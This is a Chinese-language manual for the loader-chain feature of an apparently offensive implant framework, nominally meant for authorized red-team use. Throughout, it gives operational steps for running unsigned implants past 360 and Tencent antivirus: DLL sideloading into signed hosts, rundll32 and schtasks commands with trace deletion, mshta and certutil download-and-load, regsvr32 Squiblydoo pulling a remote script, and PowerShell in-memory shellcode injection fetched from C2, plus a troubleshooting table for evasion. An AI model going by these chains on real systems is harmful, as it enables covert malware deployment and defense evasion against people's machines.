# 加载器链（落地链）使用说明

> 本文档面向**已获授权的红队测试**：仅在你拥有书面授权的目标上使用。
> 适用版本：**v1.4.0（2026-09-28 已发布；上一发布版 v1.3.5）**。
> 生成逻辑在 `internal/server/api/oneliner.go`（`loaderChainVariants` / `LoaderAdvice`），
> 建议生成入口是「生成载荷」页返回的 `one_liners` 数组（每条变体带 `note` 字段）。
>
> 相关文档：[`USAGE.md`](../USAGE.md)（安装/构建/签名的完整手册）、[`docs/EVASION.md`](EVASION.md)
> （免杀的三类划分与"验证到了什么程度"，**建议先读它**，避免把落地链当成免杀手段）。

## 0. 为什么需要"加载器链"

实测环境事实（重要）：

- 在装有 **360 安全卫士 / 腾讯电脑管家 / 无边界安全系统** 等国产安全软件的主机上，
  **任何新生成或未签名的 PE 一执行就被拒绝并删除文件**；
- 连 Hello World 级别的 Go 程序也一样；微软签名的系统程序副本（如 `notepad.exe` 的副本）
  可以正常运行。

结论：**"直接下发一个未签名 exe 再执行"这条路在加固主机上基本无效**。要么先让载荷具备
有效签名，要么改成"不落地未签名 PE"或"由已签名宿主加载"的链路 —— 这就是加载器链。

> 本项目**不内置任何第三方加载器 / 宿主程序 / 二进制**。白加黑里的已签名宿主 exe 及其
> 加载的 DLL 名、Squiblydoo 用的 SCT 脚本，全部由操作员自备，并**自负合规责任**。
> 生成的命令只调用 Windows 自带程序（`rundll32` / `mshta` / `regsvr32` / `schtasks` /
> `certutil` / `powershell`），下载地址一律复用服务端已解析出的下载基址。

## 1. 什么时候用哪条

| 场景 | 首选链路 | 备选 |
| --- | --- | --- |
| 载荷**已签名**（受信任证书 + 时间戳） | 直接运行（`one_liners` 里的 PowerShell/BITS/certutil/curl 变体） | 计划任务 + 已签名宿主 |
| 载荷未签名，目标机有 360/电脑管家 | **白加黑（DLL 侧加载）** | 内存加载（shellcode 注入签名进程） |
| 需要执行时机与会话解耦 / 定时触发 | **计划任务 + 已签名宿主** | 白加黑 |
| 只要"能跑起来"，目标机防护较松 | LOLBin 直载（`rundll32` / `mshta` / `certutil`+宿主） | `regsvr32` Squiblydoo |
| 完全不允许落地任何 PE | **内存加载**（PowerShell `-enc` 注入 shellcode） | mshta 出网 + 签名宿主注入骨架 |
| Linux 目标 | `curl`/`wget` 直接下载执行，落地到 `$HOME/.cache` 规避 `/tmp noexec` | busybox / `python3 -c urllib` |
| macOS 目标 | 清 `com.apple.quarantine` 或 ad-hoc `codesign` 后运行 | 脚本类落地方式 |

服务端会在生成响应里同时给出这些变体的文本命令，每条 `note` 都写明前置条件与风险等级。
`LoaderAdvice(targetOS, format, signed)` 是纯函数，按"是否已签名 + 平台/格式"给出
"该走哪条链"的结论，经响应字段 `loader_advice_title` / `loader_advice_tips` 返回，
控制台在生成结果区直接展示。注意它只给**建议**，实际命令仍需操作员按 §2 的前置条件自备宿主。

## 2. 各链路的前置条件与国产杀软风险

风险等级含义：**低** = 通常能过；**中** = 取决于宿主机白名单信誉，需要试；
**高** = 国产杀软重点行为规则，大概率被拦，仅作短平快补充。

### 2.1 白加黑 · 签名宿主 DLL 侧加载（风险：中）

前置条件：

1. **服务端要有与目标架构严格匹配的 mingw-w64 gcc**（c-shared 构建走 C 工具链，用错架构产出的 DLL 宿主加载不了）：

   | 目标架构 | 需要的编译器（可执行文件名） | MSYS2 安装命令 |
   |---|---|---|
   | `amd64` | `x86_64-w64-mingw32-gcc` | `pacman -S mingw-w64-x86_64-gcc` |
   | `386` | `i686-w64-mingw32-gcc` | `pacman -S mingw-w64-i686-gcc` |

   生成载荷页的「DLL 载荷」一栏会直接显示本机是否可用、**缺哪一个**；`GET /api/v1/builders`
   的 `evasion.dll_available` / `dll_message` 以及按架构细分的 `evasion.dll_arch.{amd64,386,arm64}`
   给的是同样的结论。

   > **为什么必须架构匹配，以及那个"坏产物"的来历**：v1.3.5 之前 `format=dll` 其实是
   > "改了扩展名的 EXE"——`go build` 在 `CGO_ENABLED=0` 下会**静默跳过** `import "C"` 的胶水，
   > 产物 `IMAGE_FILE_DLL=false`、没有导出表，白加黑与 rundll32 第一步就注定失败，
   > 而构建却报"成功"。这是最坑的地方。现在改为 `-buildmode=c-shared` + `CGO_ENABLED=1`，
   > 产物是**真 DLL**（`IMAGE_FILE_DLL=true` + 导出表）；同时**缺 gcc、或本机只有错误架构的
   > gcc 时，构建阶段就直接失败**，报错会写明"请求 amd64，但本机只有 i686
   > （`i686-w64-mingw32-gcc`）"并给出安装命令。
   > 也就是说：**看到这条明确的 gcc 报错是正常行为，不是 bug** —— 它替代了过去"静默产出
   > 一个宿主加载不了的 DLL"的错误行为。
2. 把植入端按 **dll** 格式构建；命令里的 `<DLL载荷ID>` 换成实际 payload ID。
   **默认「DLL 加载即启动」**：DLL 被宿主加载时就自动上线，宿主调用哪个导出函数都无所谓；
   想由宿主决定触发时机，就在生成载荷页取消勾选「DLL 加载即启动」（对应请求字段 `dll_autostart: false`）。
3. **操作员自备**一个已签名的宿主 exe，以及它启动时会加载的 DLL 文件名。找法：
   - 用 Procmon 过滤 `Process Name` = 该宿主、`Path` ends with `.dll`、
     `Result` = `NAME NOT FOUND`；
   - 缺哪个同目录 DLL 时宿主仍能继续启动，那个 DLL 名就是可劫持点（侧加载点）；
   - 不要使用系统关键 DLL 名（可能破坏系统或被自保护拦截）。
   - 若宿主**必须**能调用到某个导出函数才继续（缺导出会报错退出），把该导出名填进
     「导出函数名」（例如 `GetFileVersionInfoW`）——服务端用 C 侧 `__stdcall` 包装导出，
     不会与系统声明冲突，386 上还会用 `-Wl,--kill-at` 剥掉 `@16` 修饰。
4. 把植入端改名为那个 DLL 名，放到宿主同目录，然后运行签名宿主：

   ```cmd
   copy payload.dll "C:\Path\SignedHost\version.dll"
   start "" "C:\Path\SignedHost.exe"
   ```

为什么**可能**有效：落地物是 DLL 而不是可执行文件，磁盘上不出现未签名的 **PE 可执行文件**，
发起执行的进程是已签名程序。注意 DLL 本身**仍然没有签名** —— 这一点没变。
为什么可能失败：360/电脑管家会校验"已签名进程加载无签名 DLL"，成功率取决于宿主与
DLL 名的白名单信誉；`certutil` 下载会在 Crypto 缓存留记录。

> **别把它当免杀手段**：DLL 只是**投递/加载链**上的一个环节，文件本身的特征不比 exe 少
> （走 c-shared 构建后，Go 不允许 cgo 包带 Go 汇编，反而少了两条规避路径，见下方"取舍"）。
> 落地/动态/静态三类的区别见 [`docs/EVASION.md`](EVASION.md)。

> **另一种用法（不需要自备宿主）**：`rundll32.exe payload.dll,Start` —— rundll32 是系统
> 签名程序，直接加载我们的 DLL 并调用导出函数；导出名默认 `Start`，可在生成载荷页改。
> 代价是 rundll32 这个组合被安全软件重点监控（所以标"高"），适合先验证链路是否通。

> **取舍（如实说明）**：Go 不允许 cgo 包带 Go 汇编，所以 DLL 构建排除了 PEB 汇编与
> amd64 直接系统调用（回退 `LoadLibrary`/`GetProcAddress` + ntdll 导出）。功能不变，
> 静态/行为特征比 `exe` 略增；需要这两条更强规避路径时用 `exe`/`raw`。

### 2.2 计划任务 + 已签名宿主（风险：高）

```cmd
schtasks /create /tn "<任务名>" /tr "rundll32.exe \"<DLL路径>\",<导出函数名>" /sc once /st 00:00 /f
schtasks /run /tn "<任务名>"
schtasks /delete /tn "<任务名>" /f
```

前置条件：dll 格式载荷 + 导出函数名；`/sc once /st 00:00` 只是计划时间，靠 `/run`
立即触发；执行后立刻 `/delete` 减少留痕。

风险：`schtasks` 创建"指向 `rundll32` + 用户可写目录 DLL"的任务是国产杀软重点规则，
**经常在建任务阶段就被拦截并回滚**；换成 `mshta`/`regsvr32` 作为宿主动作同样敏感。

### 2.3 LOLBin 直载（风险：高）

- `rundll32` 侧加载：`rundll32.exe "%TEMP%\<DLL文件名>.dll",<导出函数名>`
  —— "rundll32 加载 `%TEMP%` 下的 DLL"是最典型的高危组合，多数环境直接拦或事后清理。
- `mshta` 内联 JScript：`WinHttp` 下载 + `ADODB.Stream` 写盘 + `rundll32` 加载
  —— 很多加固基线用 AppLocker/WDAC 直接禁用 `mshta`。
- `certutil` 下载 + 宿主加载：`certutil` 是签名工具，但"下载 + `rundll32` 加载用户目录
  DLL"仍然敏感，且 `certutil` 会在 Crypto 缓存留记录（`certutil -urlcache * delete` 清理）。
- `regsvr32 /s /n /u /i:<sct地址> scrobj.dll`（Squiblydoo）：
  **注意**：当前下载接口返回的是 PE/hex 载荷，**不是 SCT 脚本**；本项目不内置也不托管
  SCT，请把自备的 SCT 放到下载基址下的静态路径（复用既有基址，不新增接口）。
  该手法在国内杀软下普遍被拦，`regsvr32` 出网拉脚本经常被直接结束进程。

### 2.4 内存加载 · 不落地 PE（风险：高）

- **首选**：`powershell -w hidden -nop -enc <Base64>`，脚本从 C2 拉取 shellcode 并注入
  当前 `powershell.exe`（微软签名进程）自身：

  ```powershell
  # 服务端生成的 -enc 串内部逻辑（示意）：
  # 1) 下载 shellcode：shellcode 格式的下载物是 hex 文本，按 hex 解码；shellcode_bin 是原始字节
  # 2) Add-Type 声明 VirtualAlloc / CreateThread / WaitForSingleObject
  # 3) VirtualAlloc(RWX 0x40) -> Marshal.Copy -> CreateThread -> WaitForSingleObject
  ```

- **备选（骨架）**：`mshta.exe` 出网把 hex 文本写到本地，再拉起已签名的 `powershell`
  执行注入 —— 价值在于把"出网进程"与"注入进程"拆开；落地物只有 hex 文本，不是 PE。

已知限制：

- `Add-Type` 会调用 .NET 编译器 `csc.exe` 并在 `%TEMP%` 生成编译中间文件；
  `ConstrainedLanguage` / AppLocker / WDAC 环境下会**直接失败**；
- **这条链路自己就是"脚本宿主 + RWX 内存 + 远程线程"**：生成的注入脚本用
  `VirtualAlloc(..., 0x3000, 0x40)` 申请 RWX（见上）。植入端自己的内存路径是
  "RW 申请 → 改 RX、硬拒 RWX"，**但这个 PowerShell 注入器不享受那条策略**，
  所以它是国产杀软行为规则的典型命中点（见 [`docs/EVASION.md`](EVASION.md) §2.2）；
- 相比下发未签名 exe，这条链路**不会"一落地就删文件"**（不落 PE），因此它是加固主机上
  值得先试的无签名方案之一 —— 但"值得先试"不等于"能过"，成败取决于目标机的脚本策略
  与行为拦截，需要在目标机上实测。

### 2.5 Linux / macOS

- Linux：不存在"国产杀软拦未签名 PE"的问题，主要看 EDR/HIDS 与加固基线。注意
  `/tmp` 被挂载为 `noexec` 时下载成功也执行不了（内置变体已含落地 `$HOME/.cache` 的版本）。
- macOS：Gatekeeper/quarantine 会挡未签名、未公证的二进制，需要
  `xattr -d com.apple.quarantine <文件>` 并 `chmod +x`，或 ad-hoc 签名
  （`codesign -s - <文件>`）。
- 这两个平台没有加载器链变体（`loaderChainVariants` 只对 Windows 生成），落地建议由
  `LoaderAdvice` 以纯文本给出。

### 2.6 载荷 ID：加载器链命令里的 `<DLL载荷ID>` / `<shellcode载荷ID>` 怎么填

加载器链常常需要**另一种格式**的载荷（白加黑要 `dll`、内存注入要 `shellcode`），
命令模板因此用占位符引用它，**不新增任何下载接口**——占位符最终拼的还是同一个
`/api/v1/implant/payload/{id}`。

- **ID 从哪来**：`POST /api/v1/builders` 的响应里就有 `id`（形如 `build-1789472722331327900`，
  控制台显示为「载荷 ID」），同时返回 `download_url`；载荷列表每项也会显示该 ID，
  旁边有「复制载荷 ID」按钮。控制台生成载荷页返回的 `one_liners` 命令里，占位符就是它。
- **一键填入**：命令面板上有「载荷 ID」填充条 —— **留空 = 用本次构建的 ID**
  （按 `dll` / `shellcode` / `shellcode_bin` 构建时界面会直接标记"已自动填入本次载荷"），
  也可以粘贴另一个载荷的 ID 去覆盖；所有含 `<DLL载荷ID>` / `<shellcode载荷ID>` 的命令
  会用这个值替换后再展示/复制。
- **服务端侧的另一半**：如果**当前构建的载荷本身就是** `dll`（或 `shellcode`），
  服务端会直接把真实下载地址填进命令，占位符根本不出现；只有"当前载荷格式不对"时
  才需要你另建一份对应格式的载荷并填它的 ID。
- 占位符没被替换就复制执行，会去请求一个不存在的 ID（404），见 §3 排查表。

## 3. 常见失败原因排查

| 现象 | 常见原因 | 处理 |
| --- | --- | --- |
| 命令执行后文件"消失" | 未签名 PE 被安全软件删除隔离 | 换白加黑 / 内存加载链；查安全软件隔离区日志 |
| 下载地址不可达 | 命令里的基址是控制台地址（`localhost`/内网） | 在"设置 → 监听器 → 公网地址(public_host)"填写目标机可达地址；响应里的 `one_liner_warning` 非空即为此情况 |
| `certutil` 报 `0x80070005`/校验失败 | 代理/网关拦截、URL 被改写、TLS 证书不被信任 | 换 `curl.exe`/BITS/HttpClient 变体；确认出口策略 |
| `rundll32` 无任何反应 | DLL 架构不匹配、导出函数名写错、DLL 被拦 | 核对 amd64/386 与导出函数名；改走白加黑让宿主加载 |
| `mshta` 直接报错退出 | AppLocker/WDAC/组策略禁用，或 ActiveX 被拦 | 换 PowerShell 变体；不要指望 `mshta` 在加固机上可用 |
| `regsvr32` 立即退出、无输出 | SCT 未托管或返回非 scriptlet 内容；出网被拦 | 确认 SCT 可经 HTTP 访问且 `Content-Type` 正常；该手法被拦则放弃 |
| `powershell -enc` 报脚本被阻止 | ConstrainedLanguage / 执行策略 / 脚本块日志 | 换 CMD 变体；或改用白加黑链 |
| 计划任务创建成功但没跑 | AV 回滚、任务被删除、`/tr` 路径含引号错误 | 检查 `schtasks /query /tn <任务名> /v`；减少引号嵌套 |
| 载荷上线后立刻掉线 | 载荷被行为拦截"半杀"（进程被挂起/网络被断） | 换注入目标进程与链路；检查是否存在 HIPS 主动防御弹窗 |
| 白加黑宿主启动异常/系统异常 | 劫持了系统关键 DLL 名 | 换宿主与 DLL 名，不要用系统关键组件 |
| 命令里的 `<DLL载荷ID>` / `<shellcode载荷ID>` 还在 | 没填载荷 ID，或本次构建的格式与该链需要的格式不一致 | 在命令面板的「载荷 ID」填充条填入真实 ID（留空 = 用本次构建），或按 `dll`/`shellcode` 格式另建一份载荷，见 §2.6；直接用未替换的命令会请求 `build-<DLL载荷ID>` 而 404 |
| 生成 `dll` 时构建直接失败，提示缺 gcc / 架构不符 | 本机没有 mingw-w64 gcc，或只有与目标架构不匹配的那个 | 这是**预期行为**（不再静默产出坏 DLL）：装 `x86_64-w64-mingw32-gcc` / `i686-w64-mingw32-gcc`，或把目标架构改成与现有 gcc 一致的那个 |

## 4. 合规与边界

- 本项目的加载器链**只生成文本命令与步骤**，不内置、不下载、不打包任何第三方宿主
  程序或加载器；
- 宿主 exe、DLL 名、SCT 脚本均由操作员自备，操作员对其来源合法性与使用合规性负全部责任；
- 仅限授权的红队/攻防演练场景使用；上线前请确认授权范围与目标清单。

> 落地链只解决"能不能被执行"，**不等于免杀**。三类的划分、每项能力的验证程度、
> 以及"动态条目尚未运行期实测"这件事，见 [`docs/EVASION.md`](EVASION.md)；
> 安装、构建参数、代码签名与常见问题见 [`USAGE.md`](../USAGE.md)。
